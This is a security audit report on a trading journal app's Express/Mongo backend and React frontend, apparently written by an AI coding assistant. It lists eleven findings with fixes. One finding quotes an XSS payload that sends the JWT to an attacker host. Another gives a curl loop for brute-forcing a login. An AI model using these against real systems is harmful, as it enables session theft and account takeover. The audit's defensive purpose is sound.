# Security Audit — Trading Journal
**Date:** 2026-05-19  
**Scope:** Full backend + frontend codebase  
**Auditor:** Claude Code (claude-sonnet-4-6)  
**Overall Risk Score:** 6.5 / 10

---

## Summary

The application has a solid structural foundation — JWT auth, bcrypt password hashing, per-resource ownership checks, and a Mongoose schema that prevents most injection attacks. The highest-risk surface is the absence of rate limiting on auth endpoints, account cross-ownership at entry creation, missing HTTP security headers, and JWT stored in localStorage. No actively exploitable critical RCE or injection vulnerability was found, but the issues below require remediation before a public-facing deployment.

---

## Top 5 Prioritized Fixes (highest risk-reduction per effort)

1. **Add rate limiting to `/api/auth/login`** (HIGH, 30 min)
2. **Add Helmet.js for HTTP security headers** (HIGH, 15 min)
3. **Validate account ownership at entry creation** (HIGH, 1 hr)
4. **Validate ObjectId format before DB queries** (MEDIUM, 1 hr)
5. **Move JWT to httpOnly cookie or add refresh-token rotation** (HIGH, 2 hr)

---

## Findings

---

### F-01 — No Rate Limiting on Auth Endpoints
**Severity:** High  
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)  
**File:** `backend/src/routes/auth.routes.ts:6-7`, `backend/src/app.ts`

**Evidence**  
`/api/auth/login` and `/api/auth/signup` are registered with no rate-limiting middleware. The only check is bcrypt timing (~100ms per attempt), which allows roughly 600 password attempts per minute per IP.

**Why it matters**  
An attacker with a username or email can brute-force weak passwords without lockout.

**Reproduction steps (no real secrets needed)**
```
# 1000 sequential login attempts — no throttle, no lockout
for i in $(seq 1 1000); do
  curl -s -o /dev/null -X POST http://localhost:3000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@example.com","password":"guess'$i'"}'
done
```

**Fix**
```bash
npm install express-rate-limit
```
```typescript
// backend/src/app.ts
import rateLimit from "express-rate-limit";

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 20,
  standardHeaders: true,
  legacyHeaders: false,
});

app.use("/api/auth", authLimiter, authRoutes);
```

---

### F-02 — Missing HTTP Security Headers (No Helmet)
**Severity:** High  
**CWE:** CWE-693 (Protection Mechanism Failure)  
**File:** `backend/src/app.ts`

**Evidence**  
`express()` is used bare — no Helmet middleware. Express adds `X-Powered-By: Express` by default and omits all defensive headers.

**Missing headers:** `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`, `Permissions-Policy`.

**Why it matters**  
Clickjacking, MIME-sniffing attacks, and reflected XSS are unmitigated at the transport layer. `X-Powered-By` leaks the server stack.

**Fix**
```bash
npm install helmet
```
```typescript
// backend/src/app.ts — add before routes
import helmet from "helmet";
app.use(helmet());
```

---

### F-03 — Account Cross-Ownership at Entry Creation (IDOR on Write)
**Severity:** High  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)  
**Files:** `backend/src/controllers/tradeEntry.controller.ts:82-128`, `backend/src/controllers/noTradeEntry.controller.ts:62-84`

**Evidence**  
When creating a `TradeEntry` or `NoTradeEntry`, `accountId` is taken directly from `req.body` with no verification that the account belongs to `req.userId`. Any authenticated user can associate their journal entries with another user's account ID.

```typescript
// tradeEntry.controller.ts:104-121 — accountId is trusted from body
const newTradeEntry = new TradeEntry({
  userId,       // req.userId (safe)
  accountId,    // req.body.accountId — NOT verified to belong to userId
  ...
});
```

**Reproduction**
```
# As user A: get your own trade entry and note a different user's accountId
# As user B: create a trade entry using user A's accountId — it succeeds
POST /api/trades-entry
{ "accountId": "<user_A_accountId>", ... }
```

**Fix**
```typescript
// In createTradeEntry, before saving:
const account = await Account.findById(accountId);
if (!account) return res.status(404).json({ message: "Account not found." });
if (account.userId.toString() !== userId) {
  return res.status(403).json({ message: "You don't have permission to use this account." });
}
```
Apply the same pattern in `createNoTradeEntry` and both `update*` handlers where `accountId` can be changed.

---

### F-04 — JWT Stored in localStorage (XSS-Stealable Token)
**Severity:** High  
**CWE:** CWE-922 (Insecure Storage of Sensitive Information)  
**Files:** `frontend/src/contexts/AuthContext.tsx:37-43`, `frontend/src/api/api.ts:24-29`

**Evidence**
```typescript
// AuthContext.tsx:38-40
localStorage.setItem("token", token);
localStorage.setItem("username", username);
localStorage.setItem("userId", userId);
```
Any JavaScript running in the page origin (e.g. via XSS in the TipTap notes field or a compromised dependency) can read the JWT.

**Why it matters**  
localStorage is fully readable by any script on the same origin. An XSS payload `fetch('https://attacker.com/?t='+localStorage.token)` exfiltrates the session token with no user interaction.

**Fix (minimal, without full session refactor)**  
Move to `httpOnly` cookies on the backend:
```typescript
// auth.controller.ts — after signing token
res.cookie("token", token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "strict",
  maxAge: 7 * 24 * 60 * 60 * 1000,
});
```
Remove `localStorage` usage from `AuthContext`. The axios interceptor reads from the cookie automatically (set `withCredentials: true` on the axios instance). Update CORS to allow credentials.

---

### F-05 — No ObjectId Validation Before Database Queries (500 on Bad Input)
**Severity:** Medium  
**CWE:** CWE-20 (Improper Input Validation)  
**Files:** `backend/src/controllers/tradeEntry.controller.ts:47`, `backend/src/controllers/account.controller.ts:44`, `backend/src/controllers/noTradeEntry.controller.ts:44`

**Evidence**
```typescript
const tradeEntry = await TradeEntry.findById(tradeEntryId); // throws CastError on bad ID
```
Passing a non-24-hex-char string (e.g. `GET /api/trades-entry/not-an-id`) causes Mongoose to throw a `CastError`, caught by `handleServerError`, returned as HTTP 500.

**Why it matters**  
Callers receive a 500 instead of a 400, hiding intent. In dev mode, the full error message leaks. At scale, malformed IDs could be used to probe error behavior.

**Fix**
```typescript
// Add a shared guard at the top of any handler that uses req.params.id
import mongoose from "mongoose";

if (!mongoose.isValidObjectId(tradeEntryId)) {
  return res.status(400).json({ message: "Invalid ID format." });
}
```

---

### F-06 — Internal Config Leak via Auth Middleware Error
**Severity:** Medium  
**CWE:** CWE-209 (Information Exposure Through an Error Message)  
**File:** `backend/src/middleware/auth.middleware.ts:21-24,30-33`

**Evidence**
```typescript
if (!secret) {
  throw new Error("JWT_SECRET is missing from environment variables.");
}
// ...
} catch (error: unknown) {
  if (error instanceof Error) {
    return res.status(403).json({ message: error.message }); // leaks the thrown message
  }
}
```
If `JWT_SECRET` is undefined (misconfigured deployment), every authenticated request returns `403 {"message":"JWT_SECRET is missing from environment variables."}` to the client.

Additionally, if the caught error is not an `Error` instance, the middleware calls neither `next()` nor any response method — leaving the HTTP connection hanging until timeout.

**Fix**
```typescript
} catch (error: unknown) {
  if (error instanceof Error && error.message.includes("JWT_SECRET")) {
    console.error("FATAL: JWT_SECRET not configured");
    return res.status(500).json({ message: "Internal server error." });
  }
  return res.status(401).json({ message: "Invalid or expired token." });
}
```

---

### F-07 — NODE_ENV Not Set in Backend .env
**Severity:** Medium  
**CWE:** CWE-215 (Insertion of Sensitive Information Into Debugging Code)  
**Files:** `backend/.env`, `backend/src/utils/handleError.ts:7-11`

**Evidence**
```typescript
const message =
  process.env.NODE_ENV === "production"
    ? "Internal server error."
    : error instanceof Error
      ? error.message       // full stack-trace-adjacent messages returned to client
      : "An unknown error occurred.";
```
The backend `.env` file has no `NODE_ENV` entry. Without it, `process.env.NODE_ENV` is `undefined`, which fails the `=== "production"` check — so full error messages are returned to API clients in any deployed environment that uses this file as-is.

**Fix**  
Add to `backend/.env` (and production environment variables):
```
NODE_ENV=production
```

---

### F-08 — Images Array Accepts Arbitrary URLs
**Severity:** Medium  
**CWE:** CWE-20 (Improper Input Validation)  
**Files:** `backend/src/controllers/tradeEntry.controller.ts:119`, `backend/src/controllers/noTradeEntry.controller.ts:75`

**Evidence**
```typescript
images: images ?? [],  // images is string[] from req.body, no URL validation
```
The `images` array accepts any string. A client can store arbitrary URLs (`javascript:...`, `data:text/html,...`, or external tracking pixels) that would be rendered in `<img>` tags in the frontend.

**Why it matters**  
No immediate remote-code path, but storing arbitrary external URLs enables CSP bypass, external resource loading, and potential SSRF-adjacent behavior if the URLs are ever fetched server-side.

**Fix**  
Validate that each image URL starts with the expected Cloudinary prefix:
```typescript
const CLOUDINARY_PREFIX = `https://res.cloudinary.com/${process.env.CLOUDINARY_CLOUD_NAME}/`;

function validateImageUrls(images: unknown[]): boolean {
  return images.every(
    (url) => typeof url === "string" && url.startsWith(CLOUDINARY_PREFIX)
  );
}

if (images && !validateImageUrls(images)) {
  return res.status(400).json({ message: "Invalid image URL." });
}
```

---

### F-09 — File MIME Type Validated by Client Header Only
**Severity:** Low  
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)  
**File:** `backend/src/middleware/upload.middleware.ts:6-12`

**Evidence**
```typescript
fileFilter: (_req, file, cb) => {
  if (file.mimetype.startsWith("image/")) {  // client-supplied header
    cb(null, true);
  }
}
```
`file.mimetype` is derived from the `Content-Type` header set by the client — it is not validated against the actual file bytes (magic numbers). A malicious file with `Content-Type: image/jpeg` but non-image content passes the filter.

**Why it matters**  
Mitigated substantially because the file is forwarded to Cloudinary (which re-validates). Risk would increase if files were ever stored locally or served directly.

**Defense-in-depth fix**  
Use the `file-type` npm package to inspect magic bytes:
```typescript
import { fileTypeFromBuffer } from "file-type";

// In uploadImage controller, before upload:
const detected = await fileTypeFromBuffer(req.file.buffer);
const allowed = ["image/jpeg", "image/png", "image/gif", "image/webp"];
if (!detected || !allowed.includes(detected.mime)) {
  return res.status(400).json({ message: "Unsupported file type." });
}
```

---

### F-10 — JSON Body Size Not Explicitly Configured
**Severity:** Low  
**CWE:** CWE-400 (Uncontrolled Resource Consumption)  
**File:** `backend/src/app.ts:16`

**Evidence**
```typescript
app.use(express.json()); // default limit is 100kb
```
No explicit `limit` is set. Express 5 defaults to 100kb — acceptable for this app, but undocumented and easy to forget if request shapes grow.

**Fix**
```typescript
app.use(express.json({ limit: "50kb" }));
```

---

### F-11 — Dependency: brace-expansion Moderate CVE
**Severity:** Low  
**CWE:** CWE-400  
**Advisory:** GHSA-jxxr-4gwj-5jf2  

**Evidence**  
`npm audit` in `backend/` reports 1 moderate vulnerability:  
> brace-expansion ≥5.0.0 <5.0.6 — Large numeric range defeats documented `max` DoS protection

**Fix**
```bash
cd backend && npm audit fix
```

---

## Checklist

| Category | Item | Status |
|---|---|---|
| Auth | Passwords hashed with bcrypt (cost 10) | PASS |
| Auth | Constant-time compare (`bcrypt.compare`) | PASS |
| Auth | Login doesn't reveal which field failed | PASS |
| Auth | Rate limiting on auth endpoints | FAIL → F-01 |
| Auth | JWT secret is sufficiently strong | PASS (30 chars, usable but borderline) |
| Auth | JWT expiry set (`7d`) | PASS |
| Auth | Token stored in httpOnly cookie | FAIL → F-04 |
| AuthZ | Ownership checked on read | PASS |
| AuthZ | Ownership checked on update | PASS |
| AuthZ | Ownership checked on delete | PASS |
| AuthZ | Account ownership verified at entry creation | FAIL → F-03 |
| Input | ObjectId validated before DB queries | FAIL → F-05 |
| Input | Image URLs validated server-side | FAIL → F-08 |
| Input | File magic bytes validated | FAIL → F-09 |
| Input | Body size limit set | FAIL → F-10 |
| Headers | Helmet / security headers | FAIL → F-02 |
| Headers | CORS restricted to known origins | PASS |
| Errors | Full errors gated by NODE_ENV | FAIL → F-07 |
| Errors | Internal config not leaked to client | FAIL → F-06 |
| Injection | SQL injection | N/A (MongoDB) |
| Injection | NoSQL operator injection (Mongoose typed inputs) | PASS |
| Injection | XSS via dangerouslySetInnerHTML | PASS (none found) |
| Injection | XSS via TipTap HTML (ProseMirror schema restricts) | PASS |
| Dependencies | npm audit clean | FAIL → F-11 (1 moderate) |
| Secrets | .env not committed to git | PASS |
| Secrets | .env.example provided | NOT APPLICABLE |
